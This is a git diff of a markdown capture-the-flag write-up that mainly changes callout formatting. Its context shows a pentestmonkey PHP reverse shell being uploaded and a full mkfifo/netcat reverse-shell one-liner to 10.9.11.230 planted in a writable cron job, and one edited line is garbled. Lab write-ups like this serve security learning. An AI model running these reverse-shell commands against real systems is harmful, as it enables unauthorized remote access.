@@ -9,8 +9,8 @@ image: /assets/img/owaspQuiz/download.jpeg
 
 
 -- -
->[!LESSON LEARNED IN THIS MACHINE]
->
+**LESSON LEARNED IN THIS MACHINE**
+
 >1. Web application Enumeration
 >2. Exploitiing `Broken Access Control in admin page`
 >3. Exploiting insecure cron jobs
@@ -132,7 +132,7 @@ In this page we can upload file and instructions specifies that it is image uplo
 
 Then i decided to upload the [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) php reverse shell which will give us a reverse shell.
 
->[!info]
+**info**
 Before uploadding a reverse shell payload from pentestmonkey make sure you are listenning with netcat through the following
 
 ```bash
@@ -208,7 +208,7 @@ On munojr home's directory there is our first flag then we will try to read it.
 ![](https://i.imgur.com/pHEL629.png)
 
 We can not read the file then lets check the cron jobs.
->[!INFO]
+**INFO**
 >After uploading linpease there is interesting  writable entry in /ect/crontab
 -- -
 
@@ -281,8 +281,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.11.230 1122 >/tmp/f
 ```
 
  And then listening to with netcat.
-
->[!info]
+*info*
 When you start netcat you have to wait for one minute so that you can have a reverse shell.
 
 
@@ -361,9 +360,8 @@ fi
 ```
 
 So the script as seen is aimed to run at every ssh login. And after some research, The script runn with root permission.
-
->[!NOTE]
->The script seems to have some immutable file attributes as shown below. It allows only `append mode!!` using `lsattr` command to view permissions of file.
+**NOTE**
+ The scri>[!NOTE]pt seems to have some immutable file attributes as shown below. It allows only `append mode!!` using `lsattr` command to view permissions of file.
 >
 
 ```bash
